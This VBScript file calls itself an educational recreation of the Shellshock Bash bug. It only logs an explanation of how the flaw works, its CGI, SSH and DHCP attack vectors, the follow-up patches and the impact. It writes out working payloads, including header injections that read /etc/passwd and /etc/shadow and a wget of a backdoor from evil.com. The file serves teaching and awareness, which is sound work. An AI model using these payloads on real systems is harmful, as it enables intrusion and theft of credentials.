' ============================================================================
' EDUCATIONAL RECREATION - SHELLSHOCK VULNERABILITY (2014)
' ============================================================================
' CVE: CVE-2014-6271 (and related: CVE-2014-6277, 6278, 7169, 7186, 7187)
' FIRST DISCOVERED: September 24, 2014
' TYPE: Remote Code Execution via Environment Variable Injection
' PLATFORM: GNU Bash (versions 1.14 through 4.3)
' IMPACT: 500M+ systems affected, 25% of internet servers vulnerable
'
' ⚠️  EDUCATIONAL PURPOSE ONLY - DO NOT EXECUTE ⚠️
' ============================================================================
'
' HOW SHELLSHOCK WORKED (High-Level Overview):
' ============================================
' 1. BASH ALLOWS function definitions in environment variables
'    - export myfunc='() { echo hello; }'
'    - The function is stored as: myfunc='() { echo hello; }'
' 2. BUG: Bash continues parsing after the function definition
'    - If you put code AFTER the function: '() { echo hello; }; MALICIOUS_CODE'
'    - Bash executes the MALICIOUS_CODE when starting a new shell
' 3. ATTACK VECTOR: Any service that sets environment variables and
'    invokes Bash can be exploited:
'    - CGI web scripts (Apache mod_cgi)
'    - SSH forced commands
'    - DHCP clients
'    - Git hooks
'    - Mail processing
' 4. IMPACT: Arbitrary command execution on vulnerable systems
'
' TECHNICAL BREAKDOWN:
' ===================
' Shellshock was a parser bug in Bash's environment variable processing.
' This recreation demonstrates the concept with SAFETY MODIFICATIONS:
' - No actual shell execution
' - Simulated environment variable injection
' - Educational demonstration of the parsing flaw
'
' ============================================================================

On Error Resume Next

' ============================================================================
' PHASE 1: Bash Function Environment Variables
' ============================================================================
' Bash allows exporting functions via environment variables. This is a
' legitimate feature for passing functions to child processes.
' ============================================================================

Sub ExplainBashFunctions()
    LogAction "=== PHASE 1: Bash Function Environment Variables ==="
    LogAction ""
    
    LogAction "LEGITIMATE USAGE:"
    LogAction ""
    LogAction "  In Bash, you can export functions to child processes:"
    LogAction ""
    LogAction "  $ greet() { echo ""Hello, World!""; }"
    LogAction "  $ export -f greet"
    LogAction ""
    LogAction "  The environment variable is stored as:"
    LogAction "  greet='() { echo ""Hello, World!""; }'"
    LogAction ""
    LogAction "  When a child Bash starts, it reads this variable"
    LogAction "  and defines the function for use in the child process."
    LogAction ""
    LogAction "This is a LEGITIMATE feature - the bug is in how it's parsed."
    LogAction ""
End Sub

' ============================================================================
' PHASE 2: The Vulnerability (Parser Continues Past Function)
' ============================================================================
' Bash's parser doesn't stop after reading the function definition.
' It continues parsing and executing any code after the closing brace.
' ============================================================================

Sub DemonstrateVulnerability()
    LogAction "=== PHASE 2: The Vulnerability ==="
    LogAction "CVE: CVE-2014-6271"
    LogAction "TYPE: Arbitrary Code Execution via Environment Variable"
    LogAction ""
    
    ' The vulnerability:
    ' Bash parses environment variables that start with '() {' as function definitions.
    ' After parsing the function, Bash SHOULD STOP. But it doesn't.
    ' It continues parsing and executing any code after the function.
    '
    ' Exploit:
    ' env x='() { :;}; MALICIOUS_COMMAND' bash -c "echo test"
    '
    ' What happens:
    ' 1. Environment variable x is set to: '() { :;}; MALICIOUS_COMMAND'
    ' 2. New bash process starts
    ' 3. Bash sees x starts with '() {', interprets as function
    ' 4. Parses the function: '() { :;}' (a no-op function)
    ' 5. BUG: Continues parsing after the function definition
    ' 6. Finds and executes: MALICIOUS_COMMAND
    ' 7. Then runs: echo test
    
    LogAction "EXPLOIT PATTERN:"
    LogAction ""
    LogAction "  env x='() { :;}; /bin/cat /etc/passwd' bash -c ""echo test"""
    LogAction ""
    LogAction "  Breakdown:"
    LogAction "    x='() { :;}'        <- Function definition (benign)"
    LogAction "    ; /bin/cat /etc/passwd <- COMMAND INJECTED AFTER function"
    LogAction "    bash -c ""echo test"" <- Starts new Bash shell"
    LogAction ""
    LogAction "  Expected behavior: Define function x, then echo ""test"""
    LogAction "  Actual behavior:   Define function x, EXECUTE /bin/cat /etc/passwd,"
    LogAction "                     then echo ""test"""
    LogAction ""
    LogAction "THE BUG: Bash parser doesn't stop after function definition"
    LogAction ""
End Sub

' ============================================================================
' PHASE 3: Web Server Exploitation (CGI)
' ============================================================================
' The most dangerous attack vector: web servers running CGI scripts.
' Apache passes HTTP headers as environment variables to CGI scripts.
' ============================================================================

Sub WebExploitation()
    LogAction "=== PHASE 3: Web Server Exploitation (CGI) ==="
    LogAction ""
    
    ' Apache mod_cgi passes HTTP headers as environment variables:
    ' HTTP_USER_AGENT -> becomes environment variable
    ' HTTP_COOKIE -> becomes environment variable
    ' HTTP_REFERER -> becomes environment variable
    '
    ' If a CGI script calls system(), popen(), or any shell command,
    ' the vulnerable Bash will execute any injected code.
    '
    ' Exploit via HTTP header:
    ' User-Agent: () { :;}; /bin/bash -c 'wget http://evil.com/backdoor.sh'
    '
    ' Apache receives this header, sets HTTP_USER_AGENT environment variable,
    ' CGI script runs (any shell command), Bash starts, executes the injection.
    
    LogAction "ATTACK VIA HTTP HEADER (simulated):"
    LogAction ""
    LogAction "  GET /cgi-bin/status.cgi HTTP/1.1"
    LogAction "  Host: vulnerable-server.com"
    LogAction "  User-Agent: () { :;}; /bin/cat /etc/shadow"
    LogAction "  Accept: */*"
    LogAction ""
    LogAction "  Server processing (simulated):"
    LogAction "    1. Apache receives request"
    LogAction "    2. Sets HTTP_USER_AGENT = ""() { :;}; /bin/cat /etc/shadow"""
    LogAction "    3. Executes CGI script"
    LogAction "    4. CGI script calls system(""echo status: OK"")"
    LogAction "    5. Bash starts, reads HTTP_USER_AGENT"
    LogAction "    6. BUG: Executes /bin/cat /etc/shadow"
    LogAction "    7. Attacker gets password hashes"
    LogAction ""
    LogAction "NOTE: This is RCE (Remote Code Execution) - no auth needed"
    LogAction "NOTE: Any HTTP header can be used as injection vector"
    LogAction ""
End Sub

' ============================================================================
' PHASE 4: Multiple Attack Vectors
' ============================================================================
' Shellshock could be exploited through many different services.
' ============================================================================

Sub MultipleVectors()
    LogAction "=== PHASE 4: Multiple Attack Vectors ==="
    LogAction ""
    
    Dim vectors, i
    vectors = Array( _
        "CGI Web Scripts: HTTP headers -> environment -> Bash", _
        "SSH: Forced commands with restricted shell bypass", _
        "DHCP: Malicious DHCP server -> client -> Bash script", _
        "Git: Git hooks executed in Bash environment", _
        "Mail: Procmail or other mail filters using Bash", _
        "sudo: Environment variable pass-through")
    
    LogAction "ATTACK VECTORS:"
    For i = 0 To UBound(vectors)
        LogAction "  " & (i + 1) & ". " & vectors(i)
    Next
    LogAction ""
    
    ' SSH example:
    LogAction "SSH FORCED COMMAND EXAMPLE:"
    LogAction "  ssh user@server '() { :;}; /bin/bash' "
    LogAction "  If user's shell is Bash and forced command is set,"
    LogAction "  the injection executes before the restriction applies."
    LogAction ""
    
    ' DHCP example:
    LogAction "DHCP EXAMPLE:"
    LogAction "  Rogue DHCP server sends malicious environment to client"
    LogAction "  Client's dhclient-script runs in Bash"
    LogAction "  Injection executes with root privileges"
    LogAction ""
End Sub

' ============================================================================
' PHASE 5: The Fix
' ============================================================================
' Multiple patches were needed as researchers found related bugs.
' ============================================================================

Sub TheFix()
    LogAction "=== PHASE 5: The Fix ==="
    LogAction ""
    
    LogAction "INITIAL PATCH (CVE-2014-6271):"
    LogAction "  Bash was modified to stop parsing after function definition."
    LogAction "  The parser now ignores any code after '() { ... }'"
    LogAction ""
    LogAction "ADDITIONAL PATCHES:"
    LogAction "  CVE-2014-6277: Code execution via crafted function names"
    LogAction "  CVE-2014-6278: Variable parsing in nested shells"
    LogAction "  CVE-2014-7169: Out-of-bounds memory access"
    LogAction "  CVE-2014-7186: Variable redir vulnerability"
    LogAction "  CVE-2014-7187: Variable parser issue"
    LogAction ""
    LogAction "NOTE: It took 6 CVEs to fully patch Shellshock"
    LogAction "NOTE: Each initial patch revealed new edge cases"
    LogAction ""
End Sub

' ============================================================================
' PHASE 6: Impact and Aftermath
' ============================================================================

Sub ImpactAndAftermath()
    LogAction "=== PHASE 6: Impact and Aftermath ==="
    LogAction ""
    
    LogAction "SCOPE OF IMPACT:"
    LogAction "  - Bash versions 1.14 through 4.3 (25 years of releases)"
    LogAction "  - 500+ million systems affected"
    LogAction "  - 25% of internet servers vulnerable"
    LogAction "  - All macOS (until 10.10), most Linux distributions"
    LogAction "  - Embedded devices (routers, IoT, cameras)"
    LogAction ""
    LogAction "AFTERMATH:"
    LogAction "  - Emergency patches deployed across internet"
    LogAction "  - Many embedded devices never got patched"
    LogAction "  - Increased scrutiny of shell script security"
    LogAction "  - Better environment variable handling standards"
    LogAction "  - IoT security concerns highlighted"
    LogAction "  - Bug bounty programs expanded"
    LogAction ""
    LogAction "DISCOVERED BY: Stephane Chazelas"
    LogAction "EXPLOITED IN THE WILD: Within hours of disclosure"
    LogAction "BOTNETS: Shellshock used in DDoS botnets against gaming servers"
    LogAction ""
End Sub

' ============================================================================
' HELPER: Logging Function
' ============================================================================
Sub LogAction(message)
    Dim fso, logFile, logPath
    
    logPath = "shellshock_educational_log.txt"
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set logFile = fso.OpenTextFile(logPath, 8, True)
    logFile.WriteLine "[" & Now & "] " & message
    logFile.Close
End Sub

' ============================================================================
' MAIN EXECUTION
' ============================================================================
Sub Main()
    LogAction "============================================"
    LogAction "EDUCATIONAL SHELLSHOCK VULNERABILITY DEMONSTRATION"
    LogAction "Date: " & Now
    LogAction "============================================"
    LogAction ""
    
    Call ExplainBashFunctions()
    Call DemonstrateVulnerability()
    Call WebExploitation()
    Call MultipleVectors()
    Call TheFix()
    Call ImpactAndAftermath()
    
    LogAction "============================================"
    LogAction "DEMONSTRATION COMPLETE"
    LogAction "No actual harm was done - this is educational"
    LogAction "============================================"
End Sub

' Execute
Call Main()

' ============================================================================
' KEY LESSONS:
' ============
' 1. 25-YEAR-OLD bugs can exist in fundamental system components
' 2. Environment variables are a trust boundary - treat input as untrusted
' 3. Parser bugs are subtle but devastating
' 4. One vulnerability can have many exploitation vectors
' 5. Patching takes time - related bugs emerge iteratively
' 6. Embedded/IoT devices are often permanently vulnerable
' ============================================================================
